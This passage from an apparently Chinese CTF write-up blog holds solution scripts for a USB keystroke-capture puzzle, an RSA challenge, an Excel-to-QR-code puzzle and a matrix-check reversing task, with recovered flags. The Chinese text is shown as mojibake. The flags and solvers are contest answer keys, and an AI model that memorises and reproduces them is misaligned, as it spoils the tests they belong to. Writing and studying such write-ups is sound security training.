class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, <span class="hljs-string">&quot;2a&quot;</span>: <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>: <span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;2c&quot;</span>: <span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="hljs-string">&quot;2d&quot;</span>: <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;2e&quot;</span>: <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;2f&quot;</span>: <span class="hljs-string">&quot;[&quot;</span>,<br>              <span class="hljs-string">&quot;30&quot;</span>: <span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;31&quot;</span>: <span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>: <span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>, <span class="hljs-string">&quot;33&quot;</span>: <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;34&quot;</span>: <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;35&quot;</span>: <span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>, <span class="hljs-string">&quot;36&quot;</span>: <span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;37&quot;</span>: <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>: <span class="hljs-string">&quot;/&quot;</span>,<br>              <span class="hljs-string">&quot;39&quot;</span>: <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>, <span class="hljs-string">&quot;3a&quot;</span>: <span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>, <span class="hljs-string">&quot;3b&quot;</span>: <span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>: <span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>, <span class="hljs-string">&quot;3d&quot;</span>: <span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>, <span class="hljs-string">&quot;3e&quot;</span>: <span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>, <span class="hljs-string">&quot;3f&quot;</span>: <span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<br>              <span class="hljs-string">&quot;40&quot;</span>: <span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>, <span class="hljs-string">&quot;41&quot;</span>: <span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>, <span class="hljs-string">&quot;42&quot;</span>: <span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>, <span class="hljs-string">&quot;43&quot;</span>: <span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>, <span class="hljs-string">&quot;44&quot;</span>: <span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>, <span class="hljs-string">&quot;45&quot;</span>: <span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br> <br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>: <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>: <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>: <span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>: <span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>: <span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>: <span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>: <span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>: <span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>: <span class="hljs-string">&quot;I&quot;</span>,<br>             <span class="hljs-string">&quot;0d&quot;</span>: <span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>: <span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>: <span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>: <span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>: <span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>: <span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>: <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>: <span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>: <span class="hljs-string">&quot;R&quot;</span>,<br>             <span class="hljs-string">&quot;16&quot;</span>: <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>: <span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>: <span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>: <span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>: <span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>: <span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>: <span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>: <span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-string">&quot;1e&quot;</span>: <span class="hljs-string">&quot;!&quot;</span>,<br>             <span class="hljs-string">&quot;1f&quot;</span>: <span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>: <span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>: <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>: <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>: <span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;24&quot;</span>: <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;25&quot;</span>: <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>: <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;27&quot;</span>: <span class="hljs-string">&quot;)&quot;</span>,<br>             <span class="hljs-string">&quot;28&quot;</span>: <span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>, <span class="hljs-string">&quot;29&quot;</span>: <span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, <span class="hljs-string">&quot;2a&quot;</span>: <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>: <span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;2c&quot;</span>: <span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="hljs-string">&quot;2d&quot;</span>: <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;2e&quot;</span>: <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;2f&quot;</span>: <span class="hljs-string">&quot;&#123;&quot;</span>,<br>             <span class="hljs-string">&quot;30&quot;</span>: <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;31&quot;</span>: <span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>: <span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>, <span class="hljs-string">&quot;33&quot;</span>: <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;34&quot;</span>: <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;35&quot;</span>: <span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>, <span class="hljs-string">&quot;36&quot;</span>: <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;37&quot;</span>: <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>: <span class="hljs-string">&quot;?&quot;</span>,<br>             <span class="hljs-string">&quot;39&quot;</span>: <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>, <span class="hljs-string">&quot;3a&quot;</span>: <span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>, <span class="hljs-string">&quot;3b&quot;</span>: <span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>: <span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>, <span class="hljs-string">&quot;3d&quot;</span>: <span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>, <span class="hljs-string">&quot;3e&quot;</span>: <span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>, <span class="hljs-string">&quot;3f&quot;</span>: <span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<br>             <span class="hljs-string">&quot;40&quot;</span>: <span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>, <span class="hljs-string">&quot;41&quot;</span>: <span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>, <span class="hljs-string">&quot;42&quot;</span>: <span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>, <span class="hljs-string">&quot;43&quot;</span>: <span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>, <span class="hljs-string">&quot;44&quot;</span>: <span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>, <span class="hljs-string">&quot;45&quot;</span>: <span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>output = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>) <span class="hljs-comment">#è¿™é‡Œæ˜¯åŠ å·å†’å·çš„æ•°æ®</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> (line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">and</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;2&#x27;</span>) <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]==<span class="hljs-string">&quot;00&quot;</span>:<br>             <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>] <span class="hljs-keyword">in</span> normalKeys.keys():<br>            output += [[normalKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]],[shiftKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]]][line[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;2&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            output += [<span class="hljs-string">&#x27;[unknown]&#x27;</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>keys.close()<br> <br>flag=<span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(output))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        a=output.index(<span class="hljs-string">&#x27;&lt;DEL&gt;&#x27;</span>)<br>        <span class="hljs-keyword">del</span> output[a]<br>        <span class="hljs-keyword">del</span> output[a-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> output[i]==<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>:<br>            flag+=<span class="hljs-number">1</span><br>            output.pop(i)<br>            <span class="hljs-keyword">if</span> flag==<span class="hljs-number">2</span>:<br>                flag=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> flag!=<span class="hljs-number">0</span>:<br>            output[i]=output[i].upper()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;output :&#x27;</span> + <span class="hljs-string">&quot;&quot;</span>.join(output))<br></code></pre></td></tr></table></figure><p><img src="/mdimg/2023hwsummer/3.png"><br>èµ›åšå¨å­ç›´æ¥æ¢­<br><img src="/mdimg/2023hwsummer/4.png"><br><code>flag&#123;ec1b8b96-56a9-f15c-4e39-503e92ab45d2&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>USBæµé‡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¬¬ä¸ƒå±Šè“å¸½æ¯åŠå†³èµ›</title>
    <link href="/2023/08/31/2023%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/"/>
    <url>/2023/08/31/2023%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easyrsa"><a href="#easyrsa" class="headerlink" title="easyrsa"></a>easyrsa</h3><p>CryptoCTF2019åŸé¢˜</p><p><a href="https://4cad.github.io/CTF_Writeups/201908%20CryptoCTF/Clever%20Girl/CryptoCTF%202019%20-%20Clever%20Girl.html">https://4cad.github.io/CTF_Writeups/201908%20CryptoCTF/Clever%20Girl/CryptoCTF%202019%20-%20Clever%20Girl.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><br>p = <span class="hljs-number">12604273285023995463340817959574344558787108098986028639834181397979984443923512555395852711753996829630650627741178073792454428457548575860120924352450409</span><br>q = <span class="hljs-number">12774247264858490260286489817359549241755117653791190036750069541210299769639605520977166141575653832360695781409025914510310324035255606840902393222949771</span><br>e = <span class="hljs-number">0x10001</span><br>n = <span class="hljs-number">161010103536746712075112156042553283066813155993777943981946663919051986586388748662616958741697621238654724628406094469789970509959159343108847331259823125490271091357244742345403096394500947202321339572876147277506789731024810289354756781901338337411136794489136638411531539112369520980466458615878975406339</span><br>c = <span class="hljs-number">15380535750650959213679345560658190067564859611922563753882617419201718847747207949211621591882732604480600745000879508274349808435529637573773711729853565120321608048340424321537282281161623712479117497156437792084977778826238039385697230676340978078264209760724043776058017336241110097549146883806481148999</span><br><br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d = gmpy2.invert(e, phi)<br>g = gmpy2.gcd(e, phi)<br>e //= g<br>d = gmpy2.invert(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>m, _ = gmpy2.iroot(m, g)<br><br><span class="hljs-comment">#print(m)</span><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br><span class="hljs-comment">#b&#x27;flag&#123;2a5a9c6fe94da5ef7edeffebb506b29a&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="æ’é˜Ÿé˜Ÿåƒæœæœ"><a href="#æ’é˜Ÿé˜Ÿåƒæœæœ" class="headerlink" title="æ’é˜Ÿé˜Ÿåƒæœæœ"></a>æ’é˜Ÿé˜Ÿåƒæœæœ</h3><p>æ‰‹æ’¸æŒ‰å¤§å°æ’åºï¼Œæ¥ç€ç”¨è„šæœ¬å¤„ç†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> openpyxl<br><br><span class="hljs-comment"># æ‰“å¼€Excelæ–‡ä»¶</span><br>file_path = <span class="hljs-string">&quot;data.xlsx&quot;</span><br>workbook = openpyxl.load_workbook(file_path)<br><br><span class="hljs-comment"># éå†æ‰€æœ‰å·¥ä½œè¡¨</span><br><span class="hljs-keyword">for</span> sheet_name <span class="hljs-keyword">in</span> workbook.sheetnames:<br>    sheet = workbook[sheet_name]<br><br>    <span class="hljs-comment"># éå†æ¯ä¸ªå•å…ƒæ ¼</span><br>    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> sheet.iter_rows():<br>        <span class="hljs-keyword">for</span> cell <span class="hljs-keyword">in</span> row:<br>            <span class="hljs-comment"># æ£€æŸ¥å•å…ƒæ ¼æ˜¯å¦ä¸ºç²—ä½“</span><br>            <span class="hljs-keyword">if</span> cell.font.bold:<br>                cell.value = <span class="hljs-string">&quot;0&quot;</span>  <span class="hljs-comment"># æ›¿æ¢ç²—ä½“æ–‡æœ¬ä¸º&quot;0&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                cell.value = <span class="hljs-string">&quot;1&quot;</span>  <span class="hljs-comment"># æ›¿æ¢ç»†æ–‡æœ¬ä¸º&quot;1&quot;</span><br><br><span class="hljs-comment"># ä¿å­˜ä¿®æ”¹åçš„Excelæ–‡ä»¶</span><br>workbook.save(<span class="hljs-string">&quot;modified_excel_file.xlsx&quot;</span>)<br></code></pre></td></tr></table></figure><p>å°†0ç•™ç™½ï¼Œå°†1æ¶‚é»‘ï¼Œå¾—åˆ°äºŒç»´ç åæ‰«ç å³å¯ã€‚</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="justamat"><a href="#justamat" class="headerlink" title="justamat"></a>justamat</h3><p>å…ˆè¾“å…¥42ä¸ªå­—ç¬¦ï¼Œç„¶åæ‹¼æˆ100ä¸ªå­—ç¬¦ï¼Œåœ¨<code>sub_4051A0</code>å¤„åŠ å¯†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_4051A0</span><span class="hljs-params">(_DWORD *a1)</span><br>&#123;<br>  _DWORD *v1; <span class="hljs-comment">// r10</span><br>  <span class="hljs-type">char</span> *v2; <span class="hljs-comment">// rbp</span><br>  _DWORD *v3; <span class="hljs-comment">// rdi</span><br>  <span class="hljs-type">char</span> *v4; <span class="hljs-comment">// r8</span><br>  <span class="hljs-type">char</span> *v5; <span class="hljs-comment">// r9</span><br>  <span class="hljs-type">char</span> *v6; <span class="hljs-comment">// rcx</span><br>  _DWORD *v7; <span class="hljs-comment">// rax</span><br>  __int64 v8; <span class="hljs-comment">// rsi</span><br>  __int64 v9; <span class="hljs-comment">// rdx</span><br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> v11[<span class="hljs-number">400</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-348h] BYREF</span><br>  <span class="hljs-type">char</span> v12[<span class="hljs-number">400</span>]; <span class="hljs-comment">// [rsp+190h] [rbp-1B8h] BYREF</span><br>  <span class="hljs-type">char</span> v13; <span class="hljs-comment">// [rsp+320h] [rbp-28h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v14; <span class="hljs-comment">// [rsp+328h] [rbp-20h]</span><br><br>  v1 = a1;<br>  v2 = v12;<br>  v14 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  qmemcpy(v11, &amp;unk_574020, <span class="hljs-keyword">sizeof</span>(v11));<br>  qmemcpy(v12, &amp;unk_5741C0, <span class="hljs-keyword">sizeof</span>(v12));<br>  v3 = a1 + <span class="hljs-number">10</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )<br>  &#123;<br>    v4 = v11;<br>    v5 = v2;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>      v6 = v4;<br>      v7 = v1;<br>      LODWORD(v8) = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        v9 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(*(_DWORD *)v6 * *v7++);<br>        v6 += <span class="hljs-number">40</span>;<br>        v8 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(v9 + v8);<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v7 != v3 );<br>      <span class="hljs-keyword">if</span> ( *(_DWORD *)v5 != (_DWORD)v8 )<br>      &#123;<br>        result = <span class="hljs-number">0LL</span>;<br>        <span class="hljs-keyword">goto</span> LABEL_10;<br>      &#125;<br>      v4 += <span class="hljs-number">4</span>;<br>      v5 += <span class="hljs-number">4</span>;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( v4 != &amp;v11[<span class="hljs-number">40</span>] );<br>    v2 += <span class="hljs-number">40</span>;<br>    v1 += <span class="hljs-number">10</span>;<br>    v3 = v7 + <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">if</span> ( v2 != &amp;v13 )<br>      <span class="hljs-keyword">continue</span>;<br>    <span class="hljs-keyword">break</span>;<br>  &#125;<br>  result = <span class="hljs-number">1LL</span>;<br>LABEL_10:<br>  <span class="hljs-keyword">if</span> ( __readfsqword(<span class="hljs-number">0x28</span>u) != v14 )<br>    sub_52D790(v3, v8, v9, v6, v4, v5);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¯10ä¸ªå­—ç¬¦è¦å¾ªç¯åŠ å¯†10æ¬¡ï¼Œè¿›è¡Œç›¸ä¹˜ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#n = 0ï¼Œ10ï¼Œ20ï¼Œ30ï¼Œ40ï¼Œ50ï¼Œ60ï¼Œ70ï¼Œ80ï¼Œ90</span><br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span>*<br>s=Solver()<br>flag = [Int(<span class="hljs-string">&quot;flag%d&quot;</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>)]<br>a = [<span class="hljs-number">0x0001C633</span>, <span class="hljs-number">0x0001DF94</span>, <span class="hljs-number">0x00020EBF</span>, <span class="hljs-number">0x0002BA40</span>, <span class="hljs-number">0x0001E884</span>, <span class="hljs-number">0x000260D1</span>, <span class="hljs-number">0x0001F9B1</span>, <span class="hljs-number">0x0001EA1A</span>, <span class="hljs-number">0x0001EEAA</span>, <span class="hljs-number">0x0001DFB2</span>, <span class="hljs-number">0x0001C1D0</span>, <span class="hljs-number">0x0001EEF2</span>, <span class="hljs-number">0x000216E1</span>, <span class="hljs-number">0x0002BE00</span>, <span class="hljs-number">0x0001FB5E</span>, <span class="hljs-number">0x00025D74</span>, <span class="hljs-number">0x0001F000</span>, <span class="hljs-number">0x000202D6</span>, <span class="hljs-number">0x00020002</span>, <span class="hljs-number">0x0001DDFE</span>, <span class="hljs-number">0x0001C017</span>, <span class="hljs-number">0x0001F08C</span>, <span class="hljs-number">0x000227F6</span>, <span class="hljs-number">0x0002C7BA</span>, <span class="hljs-number">0x000201AE</span>, <span class="hljs-number">0x00027FBF</span>, <span class="hljs-number">0x00020E21</span>, <span class="hljs-number">0x0001FF5C</span>, <span class="hljs-number">0x0001FD62</span>, <span class="hljs-number">0x0001E948</span>, <span class="hljs-number">0x0001BE6E</span>, <span class="hljs-number">0x0001F4D7</span>, <span class="hljs-number">0x00022C8D</span>, <span class="hljs-number">0x0002C353</span>, <span class="hljs-number">0x0001F8DB</span>, <span class="hljs-number">0x00026E1D</span>, <span class="hljs-number">0x0001FF61</span>, <span class="hljs-number">0x0001EA0F</span>, <span class="hljs-number">0x0001F0D6</span>, <span class="hljs-number">0x0001EDA8</span>, <span class="hljs-number">0x0001AD7D</span>, <span class="hljs-number">0x00018218</span>, <span class="hljs-number">0x0001CCD4</span>, <span class="hljs-number">0x000239B6</span>, <span class="hljs-number">0x0001AC4C</span>, <span class="hljs-number">0x00020D7C</span>, <span class="hljs-number">0x0001D967</span>, <span class="hljs-number">0x0001A4F4</span>, <span class="hljs-number">0x0001CAD8</span>, <span class="hljs-number">0x000196AE</span>, <span class="hljs-number">0x0001831B</span>, <span class="hljs-number">0x00017E45</span>, <span class="hljs-number">0x0001D0CF</span>, <span class="hljs-number">0x00023EDF</span>, <span class="hljs-number">0x000181AE</span>, <span class="hljs-number">0x00021760</span>, <span class="hljs-number">0x0001D3B4</span>, <span class="hljs-number">0x000175D6</span>, <span class="hljs-number">0x00017D3A</span>, <span class="hljs-number">0x0001994F</span>, <span class="hljs-number">0x0001189D</span>, <span class="hljs-number">0x00014CCF</span>, <span class="hljs-number">0x0001568E</span>, <span class="hljs-number">0x00017EEB</span>, <span class="hljs-number">0x0001327E</span>, <span class="hljs-number">0x00016A45</span>, <span class="hljs-number">0x00012921</span>, <span class="hljs-number">0x00011FF0</span>, <span class="hljs-number">0x00013643</span>, <span class="hljs-number">0x00011729</span>, <span class="hljs-number">0x00015191</span>, <span class="hljs-number">0x00017D17</span>, <span class="hljs-number">0x00017262</span>, <span class="hljs-number">0x0001A863</span>, <span class="hljs-number">0x00017010</span>, <span class="hljs-number">0x00017B10</span>, <span class="hljs-number">0x00014F9C</span>, <span class="hljs-number">0x000143E8</span>, <span class="hljs-number">0x00015E9B</span>, <span class="hljs-number">0x0001242C</span>, <span 